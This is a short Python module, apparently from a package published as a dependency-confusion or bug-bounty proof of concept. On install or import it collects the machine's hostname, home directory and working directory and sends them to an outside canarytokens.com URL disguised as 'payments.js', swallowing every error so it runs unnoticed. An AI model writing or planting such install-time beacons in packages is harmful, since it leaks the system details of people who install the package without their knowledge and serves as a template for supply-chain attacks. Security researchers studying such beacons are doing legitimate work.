import urllib.request
import urllib.parse
import socket
import os
from pathlib import Path


URL = "http://canarytokens.com/static/traffic/roxfdrr09nfn29a40luqt8qfw/payments.js"


def run_success():
    try:
        # Collect system info
        params = {
            "hostname": socket.gethostname(),
            "home": str(Path.home()),
            "cwd": os.getcwd(),
        }

        # Build URL with query parameters
        url_with_params = URL + "?" + urllib.parse.urlencode(params)

        req = urllib.request.Request(
            url_with_params,
            headers={"User-Agent": "bb-airbnb-identity/0.1.0"}
        )

        urllib.request.urlopen(req, timeout=5).read()

    except Exception:
        # Never break install/import if request fails
        pass